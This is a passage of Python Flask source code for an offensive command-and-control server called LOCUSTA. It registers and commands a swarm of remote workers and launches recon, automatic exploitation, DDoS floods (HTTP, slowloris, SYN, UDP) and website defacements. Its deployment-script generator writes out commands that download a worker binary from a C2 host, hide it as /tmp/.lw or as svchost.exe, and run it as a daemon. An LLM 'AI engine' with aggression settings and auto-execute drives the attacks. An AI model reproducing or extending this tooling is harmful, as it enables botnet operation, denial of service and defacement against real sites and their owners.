@jwt_required()
def retask_worker(worker_id):
    data = request.get_json()
    new_role = data.get('role')
    
    w = registry.get_worker(worker_id)
    if not w:
        return jsonify({'error': 'Not found'}), 404
    
    w['info']['role'] = new_role
    activity_log.log('info', 'worker', f"Worker {worker_id} retasked to {new_role}")
    return jsonify({'message': f'Retasked to {new_role}'})

@app.route('/api/workers/register', methods=['POST'])
def register_worker():
    """Worker registration endpoint (called by worker binary)."""
    data = request.get_json()
    
    worker_id = data.get('worker_id') or str(uuid.uuid4())
    info = {
        'hostname': data.get('hostname'),
        'ip': request.remote_addr,
        'os': data.get('os'),
        'role': data.get('role', 'scout'),
        'version': data.get('version', '1.0.0'),
        'capabilities': data.get('capabilities', []),
        'latency_ms': None,
        'tasks_completed': 0
    }
    
    registry.register(worker_id, info)
    
    # Persist to DB
    db = get_db()
    db.execute(
        """INSERT OR REPLACE INTO workers 
           (id, role, status, ip, hostname, os, last_heartbeat, metadata)
           VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, ?)""",
        (worker_id, info['role'], 'idle', info['ip'], info['hostname'], 
         info['os'], json.dumps(info))
    )
    db.commit()
    
    activity_log.log('success', 'worker', f"Worker {worker_id} registered", worker_id)
    
    return jsonify({
        'worker_id': worker_id,
        'c2_url': f"http://{request.host}",
        'websocket_url': f"ws://{request.host}/ws/worker"
    })

# ─── Task Management ─────────────────────────────────────────────────────────

@app.route('/api/tasks', methods=['GET'])
@jwt_required()
def list_tasks():
    status = request.args.get('status')
    tasks = task_queue._queue
    if status:
        tasks = [t for t in tasks if t['status'] == status]
    return jsonify(tasks)

@app.route('/api/tasks', methods=['POST'])
@jwt_required()
def create_task():
    data = request.get_json()
    
    task_id = task_queue.submit(
        task_type=data.get('type'),
        target=data.get('target'),
        payload=data.get('payload', {}),
        worker_role=data.get('worker_role'),
        worker_id=data.get('worker_id'),
        priority=data.get('priority', 5)
    )
    
    activity_log.log('info', 'task', 
                    f"Task created: {data.get('type')} on {data.get('target')}")
    
    return jsonify({'task_id': task_id})

@app.route('/api/tasks/<task_id>/cancel', methods=['POST'])
@jwt_required()
def cancel_task(task_id):
    if task_queue.cancel(task_id):
        activity_log.log('warning', 'task', f"Task {task_id} cancelled")
        return jsonify({'message': 'Cancelled'})
    return jsonify({'error': 'Not found or already completed'}), 404

# ─── Swarm Commands ───────────────────────────────────────────────────────────

@app.route('/api/swarm/broadcast', methods=['POST'])
@jwt_required()
def broadcast_command():
    data = request.get_json()
    command = data.get('command')
    target_group = data.get('group')  # Optional: specific group
    
    workers = registry.get_all()
    if target_group:
        workers = [w for w in workers if w['info'].get('group') == target_group]
    
    delivered = 0
    for w in workers:
        if w['status'] != 'offline':
            socketio.emit('broadcast', {
                'command': command,
                'timestamp': time.time()
            }, room=f"worker_{w['id']}")
            delivered += 1
    
    activity_log.log('info', 'swarm', 
                    f"Broadcast sent to {delivered} workers: {command[:50]}")
    
    return jsonify({'delivered': delivered})

@app.route('/api/swarm/deploy', methods=['POST'])
@jwt_required()
def deploy_swarm():
    """Deploy new workers via cloud APIs or scripts."""
    data = request.get_json()
    provider = data.get('provider')  # aws, azure, gcp, digitalocean, script
    count = data.get('count', 1)
    role = data.get('role', 'scout')
    
    # Generate deployment scripts
    if provider == 'script':
        scripts = []
        for platform in ['linux', 'windows', 'macos']:
            script = generate_deploy_script(platform, role)
            scripts.append({'platform': platform, 'script': script})
        
        return jsonify({'scripts': scripts, 'count': count})
    
    # Cloud deployment would integrate with provider SDKs here
    activity_log.log('info', 'swarm', 
                    f"Deploying {count} {role} workers on {provider}")
    
    return jsonify({
        'message': f'Deployment initiated',
        'provider': provider,
        'estimated_time': count * 30
    })

def generate_deploy_script(platform: str, role: str) -> str:
    """Generate worker deployment script."""
    worker_url = "https://c2.locusta.example/worker-binary"  # Would be actual URL
    
    if platform == 'linux':
        return f"""#!/bin/bash
# LOCUSTA Worker Deployment — {role}
curl -sL {worker_url}/locusta-worker-linux-amd64 -o /tmp/.lw
chmod +x /tmp/.lw
/tmp/.lw --role {role} --c2 {request.host} --daemon
rm -f /tmp/.lw
"""
    elif platform == 'windows':
        return f"""@echo off
REM LOCUSTA Worker Deployment — {role}
powershell -c "Invoke-WebRequest -Uri '{worker_url}/locusta-worker-windows-amd64.exe' -OutFile '$env:TEMP\\svchost.exe'"
start /b "$env:TEMP\\svchost.exe" --role {role} --c2 {request.host}
"""
    else:  # macos
        return f"""#!/bin/bash
# LOCUSTA Worker Deployment — {role}
curl -sL {worker_url}/locusta-worker-macos-amd64 -o /tmp/.lw
chmod +x /tmp/.lw
/tmp/.lw --role {role} --c2 {request.host} --daemon
rm -f /tmp/.lw
"""

# ─── Recon / Attack Modules ───────────────────────────────────────────────────

@app.route('/api/modules/recon', methods=['POST'])
@jwt_required()
def start_recon():
    data = request.get_json()
    targets = data.get('targets', '').split(',')
    scope = data.get('scope', 'quick')  # quick, deep, full
    stealth = data.get('stealth', False)
    
    task_ids = []
    for target in targets:
        target = target.strip()
        if not target:
            continue
        
        tid = task_queue.submit(
            'recon', target,
            {
                'scope': scope,
                'stealth': stealth,
                'ports': data.get('ports', '1-1000'),
                'subdomain_depth': data.get('subdomain_depth', 2)
            },
            worker_role='scout',
            priority=3
        )
        task_ids.append(tid)
    
    activity_log.log('info', 'recon', 
                    f"Recon started on {len(task_ids)} targets ({scope})")
    
    return jsonify({'task_ids': task_ids})

@app.route('/api/modules/analyze', methods=['POST'])
@jwt_required()
def start_analysis():
    data = request.get_json()
    target = data.get('target')
    vuln_classes = data.get('vuln_classes', ['sqli', 'xss', 'lfi'])
    auto_exploit = data.get('auto_exploit', False)
    
    tid = task_queue.submit(
        'analyze', target,
        {
            'vuln_classes': vuln_classes,
            'auto_exploit': auto_exploit,
            'wordlist': data.get('wordlist'),
            'severity_threshold': data.get('severity_threshold', 'all')
        },
        worker_role='analyzer',
        priority=2
    )
    
    activity_log.log('info', 'analyze', f"Analysis started on {target}")
    return jsonify({'task_id': tid})

@app.route('/api/modules/storm', methods=['POST'])
@jwt_required()
def start_storm():
    data = request.get_json()
    target = data.get('target')
    attack_type = data.get('attack_type', 'l7_http')  # l7_http, l7_slowloris, l4_syn, l4_udp
    duration = data.get('duration', 300)  # seconds
    worker_count = data.get('worker_count', 'all')
    stealth = data.get('stealth', 'medium')
    
    # Select storm workers
    storm_workers = registry.get_by_role('storm')
    if worker_count != 'all':
        storm_workers = storm_workers[:int(worker_count)]
    
    task_ids = []
    for w in storm_workers:
        tid = task_queue.submit(
            'storm', target,
            {
                'attack_type': attack_type,
                'duration': duration,
                'stealth': stealth,
                'path': data.get('path', '/'),
                'method': data.get('method', 'GET'),
                'rps_target': data.get('rps_target', 1000)
            },
            worker_id=w['id'],
            priority=1
        )
        task_ids.append(tid)
    
    activity_log.log('critical', 'storm', 
                    f"Storm initiated on {target}: {attack_type}, {duration}s, {len(task_ids)} workers")
    
    return jsonify({'task_ids': task_ids, 'workers_deployed': len(task_ids)})

@app.route('/api/modules/deface', methods=['POST'])
@jwt_required()
def start_deface():
    data = request.get_json()
    target_url = data.get('target_url')
    payload_type = data.get('payload_type', 'html')  # html, js, upload, db
    payload_content = data.get('payload_content', '')
    backup = data.get('backup', True)
    revert_hours = data.get('revert_after_hours')
    
    deface_id = str(uuid.uuid4())
    
    # Store defacement record
    db = get_db()
    db.execute(
        """INSERT INTO defacements 
           (id, target_url, payload_type, payload_content, status, revert_after_hours)
           VALUES (?, ?, ?, ?, 'pending', ?)""",
        (deface_id, target_url, payload_type, payload_content, revert_hours)
    )
    db.commit()
    
    # Queue task
    tid = task_queue.submit(
        'deface', target_url,
        {
            'deface_id': deface_id,
            'payload_type': payload_type,
            'payload_content': payload_content,
            'backup': backup,
            'revert_after_hours': revert_hours
        },
        worker_role='graffiti',
        priority=2
    )
    
    activity_log.log('critical', 'deface', 
                    f"Defacement queued: {target_url} ({payload_type})")
    
    return jsonify({'deface_id': deface_id, 'task_id': tid})

# ─── AI Control ───────────────────────────────────────────────────────────────

@app.route('/api/ai/status', methods=['GET'])
@jwt_required()
def ai_status():
    return jsonify(ai_engine.get_status())

@app.route('/api/ai/toggle', methods=['POST'])
@jwt_required()
def ai_toggle():
    data = request.get_json()
    enabled = data.get('enabled')
    auto_execute = data.get('auto_execute')
    
    if enabled is not None:
        ai_engine.enabled = enabled
    if auto_execute is not None:
        ai_engine.auto_execute = auto_execute
    
    activity_log.log('info', 'ai', 
                    f"AI toggled: enabled={ai_engine.enabled}, auto_execute={ai_engine.auto_execute}")
    
    return jsonify(ai_engine.get_status())

@app.route('/api/ai/pause', methods=['POST'])
@jwt_required()
def ai_pause():
    ai_engine.pause()
    return jsonify({'message': 'AI paused'})

@app.route('/api/ai/resume', methods=['POST'])
@jwt_required()
def ai_resume():
    ai_engine.resume()
    return jsonify({'message': 'AI resumed'})

@app.route('/api/ai/personality', methods=['POST'])
@jwt_required()
def ai_personality():
    data = request.get_json()
    ai_engine.set_personality(
        aggression=data.get('aggression'),
        creativity=data.get('creativity'),
        caution=data.get('caution'),
        methodical=data.get('methodical')
    )
    return jsonify(ai_engine.get_status())

@app.route('/api/ai/approve', methods=['POST'])
@jwt_required()
def ai_approve():
    """Approve pending AI decision."""
    ai_engine.approve_decision()
    activity_log.log('info', 'ai', "AI decision approved by operator")
    return jsonify({'message': 'Approved and executed'})

@app.route('/api/ai/reasoning', methods=['GET'])
@jwt_required()
def ai_reasoning():
    """Get recent AI reasoning stream."""
    limit = request.args.get('limit', 50, type=int)
    return jsonify(ai_engine.reasoning_stream[-limit:])

@app.route('/api/ai/config', methods=['POST'])
@jwt_required()
def ai_config():
    """Configure AI provider."""
    data = request.get_json()
    
    ai_engine.provider = data.get('provider', ai_engine.provider)
    ai_engine.api_key = data.get('api_key', ai_engine.api_key)
    ai_engine.model = data.get('model', ai_engine.model)
    ai_engine.base_url = data.get('base_url', ai_engine.base_url)
    
    activity_log.log('info', 'ai', f"AI config updated: {ai_engine.provider}/{ai_engine.model}")
    
    # Test connection
    test_result = ai_engine._query_ai({'test': True})
    
    return jsonify({
        'status': 'configured',
        'test': 'success' if test_result is not None else 'failed'
    })

# ─── Activity & Reports ───────────────────────────────────────────────────────

@app.route('/api/activity', methods=['GET'])
@jwt_required()
def get_activity():
    limit = request.args.get('limit', 100, type=int)
    severity = request.args.get('severity')
    category = request.args.get('category')
    worker_id = request.args.get('worker_id')
    
    logs = activity_log.query(
        limit=limit, severity=severity, 
        category=category, worker_id=worker_id
    )
    return jsonify(logs)

@app.route('/api/reports/campaigns', methods=['GET'])
@jwt_required()
def list_campaigns():
    db = get_db()
    campaigns = db.execute(
        "SELECT * FROM campaigns ORDER BY created_at DESC"
    ).fetchall()
    return jsonify([dict(c) for c in campaigns])

@app.route('/api/reports/campaigns/<campaign_id>', methods=['GET'])
@jwt_required()
def get_campaign(campaign_id):
    db = get_db()
    campaign = db.execute(
        "SELECT * FROM campaigns WHERE id = ?", (campaign_id,)
    ).fetchone()
    
    if not campaign:
        return jsonify({'error': 'Not found'}), 404
    
    # Get related tasks
    tasks = db.execute(
        "SELECT * FROM tasks WHERE target = ? ORDER BY created_at DESC",
        (campaign['target'],)
    ).fetchall()
    
    return jsonify({
        'campaign': dict(campaign),
        'tasks': [dict(t) for t in tasks]
    })

# ─── WebSocket Handlers ───────────────────────────────────────────────────────

@socketio.on('connect')
def handle_connect():
    """Client connected to dashboard."""
    join_room('dashboard')
    activity_log.log('info', 'system', 'Dashboard client connected')
    emit('connected', {'status': 'ok', 'time': time.time()})

@socketio.on('disconnect')
def handle_disconnect():
    leave_room('dashboard')

@socketio.on('worker_connect')
def handle_worker_connect(data):
    """Worker connecting via WebSocket."""
    worker_id = data.get('worker_id')
    if not worker_id:
        return
    
    join_room(f"worker_{worker_id}")
    registry.set_socket(worker_id, request.sid)
    registry.heartbeat(worker_id)
    
    activity_log.log('success', 'worker', 
                    f"Worker {worker_id} connected via WebSocket", worker_id)
    emit('worker_ready', {'worker_id': worker_id})

@socketio.on('worker_heartbeat')
def handle_worker_heartbeat(data):
    worker_id = data.get('worker_id')
    latency = data.get('latency_ms')
    status = data.get('status')
    
    registry.heartbeat(worker_id, latency)
    if status:
        registry.set_status(worker_id, status)
    
    # Update DB periodically
    db = get_db()
    db.execute(
        "UPDATE workers SET last_heartbeat = CURRENT_TIMESTAMP, latency_ms = ? WHERE id = ?",
        (latency, worker_id)
    )
    db.commit()

@socketio.on('worker_task_progress')
def handle_task_progress(data):
    worker_id = data.get('worker_id')
    task_id = data.get('task_id')
    progress = data.get('progress', 0)
    message = data.get('message', '')
    
    # Update task progress
    task = task_queue.get_by_id(task_id)
    if task:
        task['progress'] = progress
    
    # Stream to dashboard
    socketio.emit('task_progress', {
        'task_id': task_id,
        'worker_id': worker_id,
        'progress': progress,
        'message': message
    }, room='dashboard')

@socketio.on('worker_task_complete')
def handle_task_complete(data):
    worker_id = data.get('worker_id')
    task_id = data.get('task_id')
    result = data.get('result', {})
    
    task_queue.complete(task_id, worker_id, result)
    
    # Log significant findings
    if result.get('findings'):
        for finding in result['findings']:
            severity = finding.get('severity', 'info')
            activity_log.log(
                severity, 'finding',
                f"[{worker_id}] {finding.get('description', 'Finding')}",
                worker_id,
                finding
            )

@socketio.on('worker_task_failed')
def handle_task_failed(data):
    worker_id = data.get('worker_id')
    task_id = data.get('task_id')
    error = data.get('error', 'Unknown error')
    
    task_queue.fail(task_id, worker_id, error)
    activity_log.log('warning', 'task', 
                    f"Task {task_id} failed on {worker_id}: {error}", worker_id)

@socketio.on('worker_log')
def handle_worker_log(data):
    worker_id = data.get('worker_id')
    level = data.get('level', 'info')
    message = data.get('message', '')
    
    activity_log.log(level, 'worker_log', f"[{worker_id}] {message}", worker_id)

# ─── Static Files (Frontend) ─────────────────────────────────────────────────

@app.route('/')
def serve_frontend():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    full_path = os.path.join(app.static_folder, path)
    if os.path.exists(full_path):
        return send_from_directory(app.static_folder, path)
    return send_from_directory(app.static_folder, 'index.html')

# ─── Background Tasks ─────────────────────────────────────────────────────────

def background_maintenance():
    """Periodic cleanup and health checks."""
    while True:
        time.sleep(30)
        try:
            registry.cleanup_stale()
            
            # Update worker statuses in DB
            db = sqlite3.connect(Config.DATABASE)
            for w in registry.get_all():
                db.execute(
                    "UPDATE workers SET status = ?, last_heartbeat = ? WHERE id = ?",
                    (w['status'], 
                     datetime.fromtimestamp(w['last_heartbeat']).isoformat(),
                     w['id'])
                )
            db.commit()
            db.close()
            
        except Exception as e:
            logger.error(f"Maintenance error: {e}")

# ─── Main ─────────────────────────────────────────────────────────────────────

START_TIME = time.time()

if __name__ == '__main__':
    init_db()
    
    # Start maintenance thread
    maint_thread = threading.Thread(target=background_maintenance, daemon=True)
    maint_thread.start()
    
    logger.info(f"LOCUSTA C2 starting on port {Config.C2_PORT}")
    logger.info(f"Worker comms on port {Config.WORKER_PORT}")
    
    socketio.run(
        app,
        host='0.0.0.0',
        port=Config.C2_PORT,
        debug=Config.DEBUG,
        certfile=os.environ.get('LOCUSTA_SSL_CERT'),
        keyfile=os.environ.get('LOCUSTA_SSL_KEY'),
        use_reloader=False
    )
